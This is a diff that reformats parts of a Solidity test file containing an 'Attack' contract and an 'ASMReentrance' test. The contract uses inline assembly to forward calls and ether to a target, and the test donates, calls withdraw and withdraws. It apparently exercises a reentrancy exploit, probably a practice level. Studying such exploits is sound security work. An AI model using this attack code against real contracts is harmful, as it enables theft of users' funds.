@@ -56,19 +56,18 @@ contract Attack {
                 dataLen // copy everything else
             )
 
-            let success := call(
-                gas(),
-                sload(target.slot),
-                v, // call with the passed value
-                ptr, // start from the pointer
-                dataLen,
-                0,
-                0
-            )
+            let success :=
+                call(
+                    gas(),
+                    sload(target.slot),
+                    v, // call with the passed value
+                    ptr, // start from the pointer
+                    dataLen,
+                    0,
+                    0
+                )
 
-            if eq(success, 0) {
-                revert(0, 0)
-            }
+            if eq(success, 0) { revert(0, 0) }
         }
     }
 
@@ -96,15 +95,7 @@ contract Attack {
                 mstore(add(ptr, 0x04), amount)
 
                 // call the function - no value
-                let success := call(
-                    gas(),
-                    sload(target.slot),
-                    0,
-                    ptr,
-                    add(ptr, 0x24),
-                    0,
-                    0
-                )
+                let success := call(gas(), sload(target.slot), 0, ptr, add(ptr, 0x24), 0, 0)
 
                 // lets add a custom revert message
                 if eq(success, 0) {
@@ -148,10 +139,7 @@ contract ASMReentrance is Test {
     }
 
     function testASMReentrance() public attack {
-        bytes memory donateCall = abi.encodeCall(
-            target.donate,
-            (address(attackContract))
-        );
+        bytes memory donateCall = abi.encodeCall(target.donate, (address(attackContract)));
         attackContract.call(donateCall, 0.1 ether);
         attackContract.call(attackContract.encodeWithdraw(), 0);
         attackContract.withdraw();
